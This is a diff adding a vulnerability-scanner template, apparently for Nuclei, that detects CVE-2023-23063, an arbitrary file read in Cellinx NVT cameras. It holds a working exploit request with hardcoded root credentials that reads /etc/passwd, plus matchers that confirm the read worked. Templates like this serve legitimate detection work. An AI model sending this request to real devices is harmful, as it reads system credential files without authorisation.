@@ -1,0 +1,30 @@
+id: cellinx-getfilecontent-cgi-file-read
+info:
+  name: Cellinx NVT GetFileContent.cgi Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,cve-2023-23063
+  description: |
+    Cellinx NVT camera GetFileContent.cgi is vulnerable to an arbitrary file read vulnerability, allowing attackers to access sensitive files like /etc/passwd.
+
+http:
+  - raw:
+      - |
+        GET /cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
